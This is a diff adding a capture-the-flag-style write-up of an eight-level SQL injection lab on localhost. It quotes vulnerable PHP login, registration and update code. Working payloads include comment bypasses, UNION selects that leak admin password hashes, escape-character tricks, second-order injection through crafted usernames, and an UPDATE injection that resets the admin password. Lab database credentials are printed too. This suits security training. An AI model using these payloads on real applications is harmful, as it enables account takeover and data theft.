@@ -1,0 +1,466 @@
+[Level 1]
+
+[*] Target: http://localhost:24001/index.php
+
+    - At this level, we should mainly focus on index.php
+
+    ...
+	try {
+		include("db.php");
+		$database = make_connection("plaintext_db");
+
+		$sql = "SELECT username FROM users WHERE username='$post_username' AND password='$post_password'";
+		
+        $query = $database->query($sql); // [?] This line is used for executing the command in the databases
+        var_dump($query) // [?] var_dump() might help if you wanna know how things work
+		
+        $user = $query->fetch_assoc(); // [?] Get the first row
+        var_dump($user)
+
+		if ($user === NULL)
+			return "Wrong username or password";
+
+		$username = $user["username"];
+		if ($username === "admin")
+			return "Wow you can log in as admin, here is your flag CBJS{FAKE_FLAG_FAKE_FLAG}, but how about <a href='level2.php'>THIS LEVEL</a>!";
+    ...
+    }
+    - Let's check out the databases, you might look at these lines in the index.php:
+        ...
+		include("db.php");
+		$database = make_connection("plaintext_db");
+        ...
+
+    => <?php
+        mysqli_report(MYSQLI_REPORT_ERROR | MYSQLI_REPORT_STRICT);
+        function make_connection($database_name) {
+            return new mysqli(getenv('MYSQL_HOSTNAME'), 
+                            getenv('MYSQL_USER'), 
+                            getenv('MYSQL_PASSWORD'), 
+                            $database_name);
+        }?>
+
+    => nothing special, just used to connect to the database, but MYSQL_HOSTNAME, MYSQL_USER, MYSQL_PASSWORD can be get from env
+    
+    => we should check the docker file or other conf
+        ...
+        environment:$result
+            # These password and stuff is not necessary too secret
+            - MYSQL_HOSTNAME=db
+            - MYSQL_ROOT_PASSWORD=45299417d86f231f6a584d1488edb763
+            - MYSQL_USER=db_user
+            - MYSQL_PASSWORD=db_password
+        ...
+        
+    => We can connect to the mysql system to see things
+
+        mysql> select * from users;
+        +----+------------------+---------------------+
+        | id | username         | password            |
+        +----+------------------+---------------------+
+        |  1 | conmeo           | meow                |
+        |  2 | trudie92         | 123456              |
+        |  3 | deckow.vernie    | 123456789           |
+        |  4 | alta35           | qwerty              |
+        |  5 | nikki13          | password            |
+        |  6 | ritchie.benton   | 1q2w3e              |
+        |  7 | kzboncak         | guest               |
+        |  8 | ulueilwitz       | luzit2000           |
+        |  9 | maegan.roob      | football            |
+        | 10 | nicholaus.ledner | master              |
+        | 11 | admin            | impossible@password |
+        ...
+
+    => This is Thinh from the future, I just saw the db.sql file, which contains all the neccesarry info
+    => with a little debugging skill    => object(mysqli_result)#2 (5) { ["current_field"]
+                                        => int(0) ["field_count"]
+                                        => int(1) ["lengths"]
+                                        => NULL ["num_rows"]
+                                        => int(1) ["type"]
+                                        => int(0) } array(1) 
+                                        { ["username"]=> string(6) "conmeo" }
+
+    - Now we solve the main problem: SELECT username FROM users WHERE username='$post_username' AND password='$post_password'
+
+        if (isset($_POST["username"]) && isset($_POST["password"])) {
+            $post_username = $_POST["username"];
+            $post_password = $_POST["password"];
+            $message = loginHandler($post_username, $post_password);}
+
+    => As you can see this is a supper basic SQli lab, we gonna solve it the classic way, turn the can't solve condition into a comment
+
+    => SELECT username FROM users WHERE username='admin'#' AND password='$post_password' => Payload: admin'#
+
+    [Final Result: Login as admin] Wow you can log in as admin, here is your flag CBJS{FAKE_FLAG_FAKE_FLAG}, but how about THIS LEVEL! 
+
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+[Level 2]
+
+[*] Target: http://localhost:24001/level2.php
+
+    - This time, the code doesn't have too much diff, just add some "\" to avoid some query errors:
+
+    ...
+    $sql = "SELECT username FROM users WHERE username=\"$post_username\" AND password=\"$post_password\"";
+    ...
+
+    - I know what ya thinking:  "SELECT username FROM users WHERE username=\"admin\"#\" AND password=\"1304\"";
+
+    => But will not gonna work since "\" in this case is used for php, not SQL, so everything is gonna work the way it should be
+       You can fix the code to see things oke
+
+		$sql = "SELECT username FROM users WHERE username=\"$post_username\" AND password=\"$post_password\"";
+		echo $sql . "<br>";
+		$query = $database->query($sql);
+		var_dump($query);
+		$user = $query->fetch_assoc();
+		var_dump($user);
+
+    SELECT username FROM users WHERE username="admin" AND password="thinh' IS NOT 'test"
+
+    => SELECT username FROM users WHERE username="admin\"#" AND password="asd"  // [?] see the problem yet
+
+    => SELECT username FROM users WHERE username=\"admin"#\" AND password=\"$post_password\" => Payload: admin"#
+
+    [Final Result: Login as admin] Wow you can log in as admin, here is your flag CBJS{FAKE_FLAG_FAKE_FLAG}, but how about THIS LEVEL! 
+
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+[Level 3]
+
+[*] Target: http://localhost:24001/level3.php
+
+    - I think you can solve this easily: 
+
+    $sql = "SELECT username FROM users WHERE username=LOWER('$post_username') AND password=LOWER('$post_password')";
+
+    => SELECT username FROM users WHERE username=LOWER('admin')#' AND password=LOWER('$post_password') => Payload: admin')#
+
+    [Final Result: Login as admin] Wow you can log in as admin, here is your flag CBJS{FAKE_FLAG_FAKE_FLAG}, but how about THIS LEVEL! 
+
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+[Level 4]
+
+[*] Target: http://localhost:24001/level4.php
+
+    - With a little debugging skill and some basic knowledge about union, you can make things right 
+
+            $sql = "SELECT username, password FROM users WHERE username='$post_username'";
+            print_r($sql);
+            $query = $database->query($sql);
+            $user = $query->fetch_assoc(); // Get the first row
+            print_r($user);
+
+            if ($user === NULL)
+                return "Username not found";
+
+            $username = $user["username"];
+            $password = $user["password"];
+            $post_password = md5($post_password);
+
+    => if I submit admin:wrongpassword => SELECT username, password FROM users WHERE username='admin'
+                                          Array ( [username] => admin [password] => 13442cabe383b86d1e1d2ce653845349 )
+
+		$username = $user["username"];
+		$password = $user["password"];
+		$post_password = md5($post_password);
+
+		if ($password !== $post_password)
+			return "Wrong username or password";
+
+    => There are 2 ways to solve this lab
+
+    [+] 1st, show admin password: ... return "You log in as $username, but then what? You are not an admin"; ...
+
+        mysql> SELECT username, password FROM users WHERE username='admin' UNION SELECT password, 123 from users WHERE username ='admin';
+        +----------------------------------+----------------------------------+
+        | username                         | password                         |
+        +----------------------------------+----------------------------------+
+        | admin                            | 13442cabe383b86d1e1d2ce653845349 |
+        | 13442cabe383b86d1e1d2ce653845349 | 123                              |
+        +----------------------------------+----------------------------------+
+
+        mysql> SELECT username, password FROM users WHERE username='thinh' UNION SELECT password, 123 from users WHERE username ='admin';
+        +----------------------------------+----------+
+        | username                         | password |
+        +----------------------------------+----------+
+        | 13442cabe383b86d1e1d2ce653845349 | 123      |
+        +----------------------------------+----------+
+
+        => Payload: thinh' UNION SELECT password, MD5('123') from users WHERE username ='admin:123
+
+    [Final Result: Login as admin] You log in as 13442cabe383b86d1e1d2ce653845349, but then what? You are not an admin 
+
+    [+] 2nd, control the admin password:
+
+        mysql> SELECT username, password FROM users WHERE username='thinh' UNION SELECT 'admin', MD5('thinhtrandeptraiprovip');
+        +----------+----------------------------------+
+        | username | password                         |
+        +----------+----------------------------------+
+        | admin    | 453858fae137c65ee0519bddd5b013e6 |
+        +----------+----------------------------------+
+
+        => Payload: Account: thinh' UNION SELECT 'admin', MD5('thinhtrandeptraiprovip')#
+                    Password: thinhtrandeptraiprovip
+
+    [Final Result: Login as admin] Wow you can log in as admin, here is your flag CBJS{FAKE_FLAG_FAKE_FLAG}, but how about THIS LEVEL!
+
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+[Level 5]
+
+[*] Target: http://localhost:24001/level5.php
+
+    - This time, it's gonna be a big challenge since you must not use any "'", how ever hacking is just using the code smartly, so I still can solve this problem
+
+        function checkValid($data)
+        {
+            if (strpos($data, "'") !== false)
+                return false;
+            return true;
+        }
+
+    - Remember \' or \" which can be used to stay away from query mistakes, in SQL things are not different
+
+        mysql> SELECT 'The Emperor\'s gift';
+            +--------------------+
+            | The Emperor's gift |
+            +--------------------+
+            | The Emperor's gift |
+            +--------------------+
+
+        $sql = "SELECT username FROM users WHERE username='thinhtran\' AND password=MD5('#')";
+
+    - Now our username is "thinhtran' AND password=MD5("
+
+        $sql = "SELECT username FROM users WHERE username='$post_username' AND password=MD5('$post_password')";
+        $query = $database->query($sql);
+        $user = $query->fetch_assoc(); // Get the first row
+
+        if ($user === NULL)
+            return "Wrong username or password"; // No result
+
+        $username = $user["username"];
+
+        if ($username === "admin")
+            return "Wow you can log in as admin, here is your flag CBJS{FAKE_FLAG_FAKE_FLAG}, but how about <a href='level6.php'>THIS LEVEL</a>!";
+
+    - Using the trick we just discovered, I can control the username output
+
+        mysql> SELECT username FROM users WHERE username='thinhtran\' AND password=MD5(' UNION SELECT admin;#')
+            +----------+
+            | username |
+            +----------+
+            | admin    |
+            +----------+
+
+    [Final Result: Login as admin] Wow you can log in as admin, here is your flag CBJS{FAKE_FLAG_FAKE_FLAG}, but how about THIS LEVEL!
+
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+[Level 6]
+
+[*] Target: http://localhost:24001/level6.php
+
+    - This lab is gonna be easy:
+
+        $id = $database->real_escape_string($_GET["id"]);
+        print_r($id);
+        echo "<br>";
+        $sql = "SELECT content FROM posts WHERE id=" . $id;
+        print_r($sql);
+        echo "<br>";
+        $db_result = $database->query($sql);
+        print_r($db_result);
+        echo "<br>";
+
+    => Just print things out to make them more clearly
+
+        $ curl http://localhost:24001/level6.php?id=3        
+                                
+            3<br>SELECT content FROM posts WHERE id=3<br>mysqli_result Object
+            (
+                [current_field] => 0
+                [field_count] => 1
+                [lengths] => 
+                [num_ro$resultws] => 1
+                [type] => 0
+            )
+            <br>Array
+            (
+                [content] => https://blog.cyberjutsu.io/2021/05/13/HTML-sanitizer-vs-XSS/
+            )
+            <br>
+
+    - I think this is our target:
+
+        mysql> select * from secret6;
+        +----+---------------------------+
+        | id | content                   |
+        +----+---------------------------+
+        |  1 | CBJS{FAKE_FLAG_FAKE_FLAG} |
+        +----+---------------------------+
+        1 row in set (0.00 sec)
+
+    => I think I gonna solve this the classic way
+
+        SELECT content FROM posts WHERE id = 31337 UNION SELECT content FROM secret6
+
+            $ curl http://localhost:24001/level6.php?id=31337%20UNION%20SELECT%20content%20FROM%20secret6
+            31337 UNION SELECT content FROM secret6<br>SELECT content FROM posts WHERE id=31337 UNION SELECT content FROM secret6<br>mysqli_result Object
+            (
+                [current_field] => 0
+                [field_count] => 1
+                [lengths] => 
+                [num_rows] => 1
+                [type] => 0
+            )
+            <br>Array
+            (
+                [content] => CBJS{FAKE_FLAG_FAKE_FLAG}
+            )
+            <br>      
+    
+    [Final Result: Read other tables's content] CBJS{FAKE_FLAG_FAKE_FLAG}
+
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+[Level 7] - Advanced Lab
+
+[*] Target: http://localhost:24001/advanced/level7.php
+
+    - So now, look at the level7.php:
+
+        $sql = "SELECT username FROM users WHERE username=? and password=?";
+        $statement = $database->prepare($sql);
+        $statement->bind_param('ss', $_POST['username'], md5($_POST['password']));
+    // [?] This way, even if an attacker tries to inject malicious input, it will be treated as a literal value and not affect the structure or behavior of the query.
+        $statement->execute();
+        $statement->store_result();
+        $statement->bind_result($result);
+
+        if ($statement->num_rows > 0) {
+            $statement->fetch();
+            $_SESSION["username"] = $result;
+            die(header("Location: profile.php"));
+        } else {
+            $message = "Wrong username or password";
+        }
+
+    => Nothing too much just used to check if the username exists
+       and if it does, redirect to the profile.php
+
+        if (!isset($_SESSION['username']))
+            die(header("Location: level7.php"));
+
+        $username = $_SESSION['username'];
+        if (isset($_POST['button'])) {
+            try {
+                $sql = "SELECT email FROM users WHERE username='$username'";
+                $db_result = $database->query($sql); // [?] This is the vulnerable part
+                $row = $db_result->fetch_assoc(); 
+                if (isset($row)) 
+                    $message = $row['email'];
+            }}
+                    
+    => And know the SQLi can be performed in this file, however, this can only interfere when the username already exists
+
+        $database = make_connection("advanced_db");
+        
+        $sql = "SELECT username from users where username=?";
+        $statement = $database->prepare($sql);
+        $statement->bind_param('s', $_POST['username']);
+        $statement->execute();
+        $statement->store_result();
+
+        if ($statement->num_rows() > 0) {
+            $message = "Sorry this username already registered";
+        } else {
+            $sql = "INSERT INTO users(username, password, email) VALUES (?, ?, ?)";
+            $statement = $database->prepare($sql);
+            $statement->bind_param('sss', $_POST['username'], md5($_POST['password']), $_POST['email']);
+            $statement->execute();
+            $message = "Create successful";
+        }
+        => Good, there is no filter, we can create any username we want
+
+        mysql> SELECT email FROM users WHERE username='x' UNION SELECT password FROM users WHERE username = 'admin';
+        +----------------------------------+
+        | email                            |
+        +----------------------------------+
+        | 13442cabe383b86d1e1d2ce653845349 |
+        +----------------------------------+
+
+    => so now we have to create a account like 
+
+        Account: x' UNION SELECT password FROM users WHERE username = 'admin 
+        Password: randompassword
+
+    [Final Result: Showing any user's password] Your Email: 13442cabe383b86d1e1d2ce653845349
+
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+[Level 8] - Advanced Labs
+
+    - This lab is much easier if you compare it with the previous one since you can directly intervene in the database
+      even though ya still need to create an account to go to the update.php
+
+        $email = $_POST['email'];
+        if ($username === 'admin')
+            $message = "<h3><b>Wow you can finally log in as admin, here is your flag CBJS{FAKE_FLAG_FAKE_FLAG}</b></h3>";
+
+        if (isset($_POST['button'])) {
+            try {
+                $sql = "UPDATE users SET email='$email' WHERE username='$username'";
+                $db_result = $database->query($sql);
+                if ($db_result) {
+                    $message = "Successfully update your Email";
+        ...
+
+    => This my logic: UPDATE users SET email='test@gmail.com', password= MD5('thinhtrandeptraiprovip') WHERE username = 'admin'#' WHERE username='$username'
+
+        [?] $sql = "SELECT username FROM users WHERE username=? and password=?";
+            $statement = $database->prepare($sql);
+            $statement->bind_param('ss', $_POST['username'], md5($_POST['password']));
+            $statement->execute();
+            $statement->store_result();
+            $statement->bind_result($result);
+
+            => That's why I still need to hash the password
+
+        mysql> select * from users;
+        +----+-------------------------------------------------------------+----------------------------------+---------------------------------+
+        | id | username                                                    | password                         | email                           |
+        +----+-------------------------------------------------------------+----------------------------------+---------------------------------+
+        |  1 | conmeo                                                      | 4a4be40c96ac6314e91d93f38043a634 | NULL                            |
+        |  2 | trudie92                                                    | 4520ae162c0aa006992454ad776377e3 | NULL                            |
+        |  3 | deckow.vernie                                               | 30ecdb365e4246775b7def432763b831 | NULL                            |
+        |  4 | alta35                                                      | b66f2dbee288882f8c95be9900fdde46 | NULL                            |
+        |  5 | nikki13                                                     | 2bc8a8d40f24d99d69365851e507a269 | NULL                            |
+        |  6 | ritchie.benton                                              | 056125d8f71d675d3d5d6284f91ba919 | NULL                            |
+        |  7 | kzboncak                                                    | 2756b329bfc05b6238458442cf6f4cd9 | NULL                            |
+        |  8 | ulueilwitz                                                  | 2d1040104f4ca09c4afa876f60cd881a | NULL                            |
+        |  9 | maegan.roob                                                 | d1c34701ced2dfeab09866fda9ace6bf | NULL                            |
+        | 10 | nicholaus.ledner                                            | 95beceb552a962a254f04a4e94864e69 | NULL                            |
+        | 11 | admin                                                       | 453858fae137c65ee0519bddd5b013e6 | test@gmail.com                  | // [?] Easy right!
+        +----+-------------------------------------------------------------+----------------------------------+---------------------------------+
+
+    => Now login with the credential: admin:thinhtrandeptraiprovip
+    
+    [Final Result: Login as admin] Wow you can finally log in as admin, here is your flag CBJS{FAKE_FLAG_FAKE_FLAG}
